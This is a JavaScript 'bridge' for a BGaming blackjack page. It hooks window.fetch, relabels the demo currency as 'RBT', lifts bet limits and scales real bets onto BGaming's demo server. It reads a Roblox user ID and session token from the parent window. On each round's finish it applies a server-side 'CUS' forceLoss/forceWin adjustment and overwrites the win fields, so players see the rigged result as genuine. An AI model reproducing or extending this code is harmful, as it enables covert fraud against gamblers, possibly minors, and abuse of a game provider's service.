/**
 * CLASSIC MULTIHAND BLACKJACK BRIDGE v3 — "CUS-Integrated"
 *
 * BGaming table games use a command-based API:
 *   command:"init"   → game config, balance, bet limits
 *   command:"start"  → deal cards, deduct bet
 *   command:"insurance" → insurance side-bet
 *   command:"hit"/"stand"/"double"/"split" → player actions
 *   command:"finish" → round result, final balance
 *
 * Bets are in: options.areas[].main.bet (cents)
 *
 * CUS Integration: On "finish", the bridge awaits the server's spin-sync
 * response. The server applies the CUS state (forceLoss / forceWin) and
 * returns { gameBalance, adjustedWin, cusApplied }. If CUS modified the
 * outcome, win amounts in the BGaming response are patched before the
 * game client sees them.
 */
(function() {
    console.log('[Bridge] Classic Multihand Blackjack Bridge v3 Active');

    function findCredentials() {
        try {
            return { id: window.parent.robloxUserId, token: window.parent._sessionToken };
        } catch(e) { return { id: null, token: null }; }
    }

    let creds = findCredentials();
    console.log('[Bridge] User:', creds.id || 'DEMO');

    let robetBalance = null;
    let pendingBetCents = 0; // the REAL bet the user intended (before scaling)
    let scaleFactor = 1;     // how much we scaled down the bet for BGaming's demo

    // BGaming demo server max bet PER AREA (from init: max_main_bet)
    const BGAMING_MAX_BET_PER_AREA = 1000000; // 10,000 RBT in cents
    const VALID_CHIPS = [100, 500, 2500, 10000, 50000, 100000, 250000, 1000000];

    /** Snap a cent value to the nearest valid chip denomination (round down). */
    function snapToChip(cents) {
        let best = VALID_CHIPS[0];
        for (const chip of VALID_CHIPS) {
            if (chip <= cents) best = chip;
        }
        return best;
    }

    const _fetch = window.fetch.bind(window);

    function exposeBalance() {
        try { window.parent._aviaGameBalance = robetBalance; } catch(e) {}
    }

    // No sequential queue needed — blackjack commands are naturally sequential
    // and we don't want to block the game waiting for our server sync

    // Start avia session on load
    (async function() {
        creds = findCredentials();
        if (!creds.id) return;
        try {
            const r = await _fetch('/api/avia/v1/session/start', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ userId: creds.id, sessionToken: creds.token })
            });
            const d = await r.json();
            if (typeof d.gameBalance === 'number') {
                robetBalance = d.gameBalance;
                exposeBalance();
            }
            console.log('[Bridge] Session started, balance:', robetBalance);
        } catch(e) { console.error('[Bridge] Init error:', e); }
    })();

    /**
     * Report a hand outcome to the server (BLOCKING — awaits CUS result).
     * Returns { gameBalance, adjustedWin, cusApplied } from the server.
     */
    async function syncSpin(bet, win) {
        if (!creds.id) return null;
        try {
            const r = await _fetch('/api/avia/v1/spin-sync', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    userId: creds.id,
                    sessionToken: creds.token,
                    bet: bet,
                    win: win
                })
            });
            const d = await r.json();
            if (typeof d.gameBalance === 'number') {
                robetBalance = d.gameBalance;
                exposeBalance();
                console.log('[Bridge] Server sync → balance: ' + robetBalance.toFixed(2) +
                    (d.cusApplied ? ' (CUS applied, adjustedWin=' + d.adjustedWin + ')' : ''));
            }
            return d;
        } catch(e) {
            console.warn('[Bridge] spin-sync failed:', e);
            // Fallback: apply locally without CUS
            robetBalance = Math.max(0, Math.round((robetBalance - bet + win) * 100) / 100);
            exposeBalance();
            return null;
        }
    }

    /**
     * Extract total bet in cents from a blackjack "start" command body.
     * Format: options.areas[{name, main:{bet:N}}]
     */
    function extractBetCents(bodyData) {
        let total = 0;
        if (bodyData.options && Array.isArray(bodyData.options.areas)) {
            for (const area of bodyData.options.areas) {
                if (area.main && typeof area.main.bet === 'number') {
                    total += area.main.bet;
                }
            }
        }
        // Fallback: top-level bet field
        if (total === 0 && typeof bodyData.bet === 'number') total = bodyData.bet;
        if (total === 0 && bodyData.options && typeof bodyData.options.bet === 'number') total = bodyData.options.bet;
        return total;
    }

    /**
     * Inject our balance into any BGaming response.
     */
    function injectBalance(data) {
        if (robetBalance === null) return;
        const walletCents = Math.round(robetBalance * 100);

        // BGaming uses data.balance or data.balance.wallet
        if (data.balance !== undefined) {
            if (typeof data.balance === 'object' && data.balance !== null) {
                data.balance.wallet = walletCents;
                if (typeof data.balance.amount !== 'undefined') data.balance.amount = walletCents;
            } else if (typeof data.balance === 'number') {
                data.balance = walletCents;
            }
        }
        // Some responses have balance at top level
        if (typeof data.wallet !== 'undefined') data.wallet = walletCents;
    }

    /**
     * Override currency and bet limits in init/config responses.
     */
    function patchConfig(data) {
        // Custom bet chips (in cents) — up to 500k RBT
        const customChips = [100, 500, 2500, 10000, 50000, 100000, 250000, 500000, 1000000, 2500000, 5000000, 10000000, 25000000, 50000000];

        if (data.options) {
            // Currency
            if (data.options.currency) {
                data.options.currency.code = 'RBT';
                data.options.currency.symbol = 'R$';
                if (data.options.currency.name) data.options.currency.name = 'RBT';
            }
            // Override bet limits
            if (data.options.chips) data.options.chips = customChips;
            if (data.options.bet_limits) {
                data.options.bet_limits.max_main_bet = 50000000; // 500k RBT
            }
        }

        // Deep replace FUN → RBT
        deepReplaceFun(data);
    }

    function deepReplaceFun(obj) {
        if (!obj || typeof obj !== 'object') return;
        if (Array.isArray(obj)) {
            for (let i = 0; i < obj.length; i++) {
                if (typeof obj[i] === 'string' && (obj[i] === 'FUN' || obj[i] === 'fun')) obj[i] = 'RBT';
                else if (typeof obj[i] === 'object') deepReplaceFun(obj[i]);
            }
            return;
        }
        for (const k of Object.keys(obj)) {
            if (typeof obj[k] === 'string' && (obj[k] === 'FUN' || obj[k] === 'fun')) obj[k] = 'RBT';
            else if (typeof obj[k] === 'object' && obj[k] !== null) deepReplaceFun(obj[k]);
        }
    }

    /**
     * Scale all monetary values in a BGaming response back up by the given factor.
     * This makes the UI display the real bet/win amounts, not the scaled-down demo amounts.
     */
    function scaleResponseUp(data, factor) {
        if (factor <= 1) return;

        // Scale result fields
        if (data.result) {
            if (typeof data.result.win === 'number') data.result.win = Math.round(data.result.win * factor);
            if (typeof data.result.win_amount === 'number') data.result.win_amount = Math.round(data.result.win_amount * factor);
            if (typeof data.result.bet === 'number') data.result.bet = Math.round(data.result.bet * factor);
            if (typeof data.result.total_bet === 'number') data.result.total_bet = Math.round(data.result.total_bet * factor);
            if (typeof data.result.total_win === 'number') data.result.total_win = Math.round(data.result.total_win * factor);
            if (Array.isArray(data.result.areas)) {
                for (const area of data.result.areas) {
                    if (typeof area.bet === 'number') area.bet = Math.round(area.bet * factor);
                    if (typeof area.win === 'number') area.win = Math.round(area.win * factor);
                    if (typeof area.win_amount === 'number') area.win_amount = Math.round(area.win_amount * factor);
                    if (typeof area.payout === 'number') area.payout = Math.round(area.payout * factor);
                    if (area.main) {
                        if (typeof area.main.bet === 'number') area.main.bet = Math.round(area.main.bet * factor);
                        if (typeof area.main.win_amount === 'number') area.main.win_amount = Math.round(area.main.win_amount * factor);
                    }
                }
            }
        }

        // Scale top-level fields
        if (typeof data.bet === 'number') data.bet = Math.round(data.bet * factor);
        if (typeof data.win === 'number') data.win = Math.round(data.win * factor);
        if (typeof data.win_amount === 'number') data.win_amount = Math.round(data.win_amount * factor);
        if (typeof data.total_bet === 'number') data.total_bet = Math.round(data.total_bet * factor);
        if (typeof data.total_win === 'number') data.total_win = Math.round(data.total_win * factor);

        // Scale areas in deal/stand/finish responses
        if (Array.isArray(data.areas)) {
            for (const area of data.areas) {
                if (typeof area.bet === 'number') area.bet = Math.round(area.bet * factor);
                if (typeof area.win === 'number') area.win = Math.round(area.win * factor);
                if (typeof area.win_amount === 'number') area.win_amount = Math.round(area.win_amount * factor);
                if (area.main) {
                    if (typeof area.main.bet === 'number') area.main.bet = Math.round(area.main.bet * factor);
                    if (typeof area.main.win_amount === 'number') area.main.win_amount = Math.round(area.main.win_amount * factor);
                }
            }
        }
    }

    /**
     * CUS: Overwrite all win fields in the BGaming response to match
     * the server's adjusted win (in RBT, not cents).
     * Called when cusApplied === true.
     */
    function patchWinFields(data, adjustedWinRBT) {
        const adjustedCents = Math.round(adjustedWinRBT * 100);

        // Patch result fields
        if (data.result) {
            if (typeof data.result.win === 'number') data.result.win = adjustedCents;
            if (typeof data.result.win_amount === 'number') data.result.win_amount = adjustedCents;
            if (typeof data.result.total_win === 'number') data.result.total_win = adjustedCents;
            if (Array.isArray(data.result.areas)) {
                for (const area of data.result.areas) {
                    if (typeof area.win === 'number') area.win = adjustedCents;
                    if (typeof area.win_amount === 'number') area.win_amount = adjustedCents;
                    if (area.main && typeof area.main.win_amount === 'number') area.main.win_amount = adjustedCents;
                }
            }
        }

        // Patch top-level fields
        if (typeof data.win === 'number') data.win = adjustedCents;
        if (typeof data.win_amount === 'number') data.win_amount = adjustedCents;
        if (typeof data.total_win === 'number') data.total_win = adjustedCents;

        // Patch areas
        if (Array.isArray(data.areas)) {
            for (const area of data.areas) {
                if (typeof area.win === 'number') area.win = adjustedCents;
                if (typeof area.win_amount === 'number') area.win_amount = adjustedCents;
                if (area.main && typeof area.main.win_amount === 'number') area.main.win_amount = adjustedCents;
            }
        }
    }

    window.fetch = function(url, options) {
        const urlStr = typeof url === 'string' ? url : (url?.url || '');

        // Don't intercept our own API calls
        if (urlStr.startsWith('/api/')) {
            return _fetch.apply(window, arguments);
        }

        // Only intercept BGaming API calls
        if (!urlStr.includes('bgaming-network.com') && !urlStr.includes('bgaming-system.com')) {
            return _fetch.apply(window, arguments);
        }

        // Parse request body
        let bodyData = null;
        let command = '';
        let betCentsThisRound = 0;

        try {
            if (options && options.body) {
                const bodyStr = typeof options.body === 'string' ? options.body : '';
                if (bodyStr) {
                    bodyData = JSON.parse(bodyStr);
                    command = bodyData.command || '';
                    console.log('[Bridge] → CMD: ' + command, JSON.stringify(bodyData));

                    // On "start" command, extract bet, check balance, and scale if needed
                    if (command === 'start') {
                        betCentsThisRound = extractBetCents(bodyData);
                        const betRBT = betCentsThisRound / 100;
                        console.log('[Bridge] Bet amount: ' + betRBT + ' RBT (' + betCentsThisRound + ' cents)');

                        // Block if exceeds balance
                        if (robetBalance !== null && betRBT > robetBalance + 0.01) {
                            console.warn('[Bridge] BLOCKED: bet ' + betRBT + ' > balance ' + robetBalance);
                            const walletCents = Math.round(robetBalance * 100);
                            return Promise.resolve(new Response(JSON.stringify({
                                balance: { wallet: walletCents },
                                error: 'insufficient_funds'
                            }), {
                                status: 200,
                                headers: { 'Content-Type': 'application/json' }
                            }));
                        }

                        pendingBetCents = betCentsThisRound;

                        // Scale down bets that exceed BGaming's per-area max
                        let needsScaling = false;
                        if (bodyData.options && Array.isArray(bodyData.options.areas)) {
                            // Find the highest per-area bet
                            let maxAreaBet = 0;
                            for (const area of bodyData.options.areas) {
                                if (area.main && typeof area.main.bet === 'number') {
                                    maxAreaBet = Math.max(maxAreaBet, area.main.bet);
                                }
                            }
                            if (maxAreaBet > BGAMING_MAX_BET_PER_AREA) {
                                scaleFactor = maxAreaBet / BGAMING_MAX_BET_PER_AREA;
                                needsScaling = true;
                                for (const area of bodyData.options.areas) {
                                    if (area.main && typeof area.main.bet === 'number') {
                                        // Scale down and snap to nearest valid chip
                                        const raw = Math.round(area.main.bet / scaleFactor);
                                        area.main.bet = snapToChip(raw);
                                    }
                                }
                                options = Object.assign({}, options, { body: JSON.stringify(bodyData) });
                                console.log('[Bridge] SCALED per-area bets by x' + scaleFactor.toFixed(2));
                            }
                        }
                        if (!needsScaling) scaleFactor = 1;
                    }

                    // "double" command doubles the bet mid-hand — scale it too
                    if (command === 'double' && scaleFactor > 1) {
                        // BGaming handles doubling internally, but if it sends a bet field, scale it
                        if (bodyData.options && Array.isArray(bodyData.options.areas)) {
                            for (const area of bodyData.options.areas) {
                                if (area.main && typeof area.main.bet === 'number') {
                                    area.main.bet = Math.round(area.main.bet / scaleFactor);
                                }
                            }
                            options = Object.assign({}, options, { body: JSON.stringify(bodyData) });
                        }
                        // Track the doubled real bet
                        pendingBetCents = pendingBetCents * 2;
                    }
                }
            }
        } catch(e) {
            console.warn('[Bridge] Body parse error:', e);
        }

        const capturedCommand = command;
        const capturedBetCents = betCentsThisRound || pendingBetCents;

        return (async () => {
            const realRes = await _fetch.call(window, url, options);
            const clone = realRes.clone();
            let data;
            try {
                data = await clone.json();
            } catch(e) {
                return realRes; // Non-JSON (assets)
            }

            console.log('[Bridge] ← RESP (' + capturedCommand + '):', JSON.stringify(data).substring(0, 500));

            // === INIT response — patch config, inject balance ===
            if (capturedCommand === 'init') {
                patchConfig(data);
                injectBalance(data);
                console.log('[Bridge] Init patched. Balance injected:', robetBalance);
            }

            // === START response — a bet was placed, cards dealt ===
            if (capturedCommand === 'start') {
                // Update local balance immediately (deduct bet)
                const betRBT = pendingBetCents / 100;
                robetBalance = Math.max(0, Math.round((robetBalance - betRBT) * 100) / 100);
                exposeBalance();

                if (scaleFactor > 1) {
                    scaleResponseUp(data, scaleFactor);
                }
                injectBalance(data);
                console.log('[Bridge] Deal started. Real bet: ' + betRBT + ' RBT (scale: x' + scaleFactor.toFixed(2) + ')');
            }

            // === FINISH response — round over, has final outcome ===
            if (capturedCommand === 'finish') {
                // Extract BGaming's win from the ACTUAL response format:
                // data.areas[].main.win_amount (per-area wins)
                let rawWinCents = 0;

                // Primary: sum win_amount from each area's main object
                if (Array.isArray(data.areas)) {
                    for (const area of data.areas) {
                        if (area.main && typeof area.main.win_amount === 'number') {
                            rawWinCents += area.main.win_amount;
                        }
                    }
                }

                // Fallback: check other possible locations
                if (rawWinCents === 0) {
                    if (data.result && typeof data.result.win === 'number') rawWinCents = data.result.win;
                    else if (typeof data.win === 'number') rawWinCents = data.win;
                    // Also check result.areas format
                    if (rawWinCents === 0 && data.result && Array.isArray(data.result.areas)) {
                        for (const area of data.result.areas) {
                            if (typeof area.win === 'number') rawWinCents += area.win;
                            if (area.main && typeof area.main.win_amount === 'number') rawWinCents += area.main.win_amount;
                        }
                    }
                }

                console.log('[Bridge] Raw win from BGaming: ' + rawWinCents + ' cents');

                const realWinCents = Math.round(rawWinCents * scaleFactor);
                const betRBT = pendingBetCents / 100;
                const winRBT = realWinCents / 100;

                // === CUS: Await server sync to get CUS-adjusted outcome ===
                const syncResult = await syncSpin(betRBT, winRBT);

                if (syncResult && syncResult.cusApplied) {
                    // Server modified the outcome — patch win fields
                    const adjustedWin = typeof syncResult.adjustedWin === 'number' ? syncResult.adjustedWin : winRBT;
                    console.log('[Bridge] CUS applied! Original win: ' + winRBT + ' → Adjusted: ' + adjustedWin);
                    patchWinFields(data, adjustedWin);
                } else if (scaleFactor > 1) {
                    // No CUS, but we still need to scale the response up
                    scaleResponseUp(data, scaleFactor);
                }

                console.log('[Bridge] FINISH — bet: ' + betRBT + ', balance: ' + robetBalance);

                pendingBetCents = 0;
                scaleFactor = 1;
                injectBalance(data);
            }

            // === Double — scale response back up ===
            if (capturedCommand === 'double' && scaleFactor > 1) {
                scaleResponseUp(data, scaleFactor);
                injectBalance(data);
            }

            // === Insurance, hit, stand, split — scale + inject balance ===
            if (['insurance', 'hit', 'stand', 'split'].includes(capturedCommand)) {
                if (scaleFactor > 1) {
                    scaleResponseUp(data, scaleFactor);
                }
                injectBalance(data);
            }

            // Always inject balance into any response that has a balance field
            injectBalance(data);

            return new Response(JSON.stringify(data), {
                status: realRes.status,
                headers: { 'Content-Type': 'application/json' }
            });
        })();
    };

    // Save on unload
    window.addEventListener('beforeunload', function() {
        if (creds.id && robetBalance !== null) {
            navigator.sendBeacon('/api/avia/v1/session/save', new Blob([
                JSON.stringify({ userId: creds.id, gameBalance: robetBalance, sessionToken: creds.token })
            ], { type: 'application/json' }));
        }
    });
})();
